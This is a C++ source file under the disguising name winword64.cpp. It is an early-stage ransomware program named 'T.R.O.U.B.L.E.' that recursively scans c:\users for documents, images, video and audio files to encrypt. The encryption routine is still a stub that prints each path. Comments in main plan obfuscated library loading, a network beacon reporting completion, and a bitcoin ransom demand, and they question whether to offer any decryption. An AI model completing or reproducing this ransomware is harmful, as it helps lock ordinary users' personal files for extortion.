// winword64.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <fstream>
#include <string>
#include <iostream>
#include <filesystem>
#include <windows.h>
namespace fs = std::experimental::filesystem;

bool ExcludePath(std::string checkString)
{
	std::string AppData = "AppData";
	std::string AllUsers = "All Users";

	if (checkString.find(AppData) != std::string::npos)
	{
		return true;
	}
	else if (checkString.find(AllUsers) != std::string::npos)
	{
		return true;
	}

	return false;
}

bool EncryptThisFile(std::string path)
{
	std::cout << "Encrypting " << path << " ..." << std::endl;

	return true;
}

DWORD FindFiles()
{
	// Get system drive

	DWORD dwFileCounter = 0;
	DWORD dwEncryptionCounter = 0;

	// File extension filters to target important files
	const std::string bmp = ".bmp";
	const std::string jpg = ".jpg";
	const std::string jpeg = ".jpeg";
	const std::string png = ".png";
	const std::string gif = ".gif";
	const std::string mp4 = ".mp4";
	const std::string mpg = ".mpg";
	const std::string mpeg = ".mpeg";
	const std::string mov = ".mov";
	const std::string mp3 = ".mp3";
	const std::string doc = ".doc";
	const std::string docx = ".docx";
	const std::string xls = ".xls";
	const std::string xlsx = ".xlsx";
	const std::string ppt = ".ppt";
	const std::string pptx = ".pptx";
	const std::string pdf = ".pdf";


	std::string path = "c:\\users";
	//std::string temp;

	for (const auto& entry : fs::recursive_directory_iterator(path))
	{
		// Check for paths to exclude from processing
		if (ExcludePath(entry.path().string()))
		{
			continue; // Excluding path 
		}
		
		if (entry.path().extension()==jpg ||
			entry.path().extension() == jpeg ||
			entry.path().extension() == png ||
			entry.path().extension() == gif ||
			entry.path().extension() == mp4 ||
			entry.path().extension() == mpg ||
			entry.path().extension() == mpeg ||
			entry.path().extension() == mov ||
			entry.path().extension() == mp3 ||
			entry.path().extension() == bmp ||
			entry.path().extension() == doc ||
			entry.path().extension() == docx ||
			entry.path().extension() == xls ||
			entry.path().extension() == xlsx ||
			entry.path().extension() == ppt ||
			entry.path().extension() == pptx ||
			entry.path().extension() == pdf)
		{
			//std::cout << entry.path() << std::endl;
			dwFileCounter++;

			// Encrypt file
			if (EncryptThisFile(entry.path().string()))
			{
				dwEncryptionCounter++;
			}
		}
	}

	std::cout << "Total files found:     " << dwFileCounter << std::endl;
	std::cout << "Total files encrypted: " << dwEncryptionCounter << std::endl;

	return dwFileCounter;
}


int main()
{
    std::cout << "Welcome to T.R.O.U.B.L.E.\n"; 

	// Decode library strings

	// Load necessary libraries via LoadLibrary

	// Find files to encrypt 
	// documents (doc, docx, pdf, xls, ppt, etc)
	// images (jpg, png, etc)
	// video (mp4, mpg, etc)
	FindFiles(); // Finds and Encrypts files

	// Send network beacon to report ransom completed

	// Display message to user demanding bitcoin payment 

	// Do we care about providing a decryption option?

}




// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
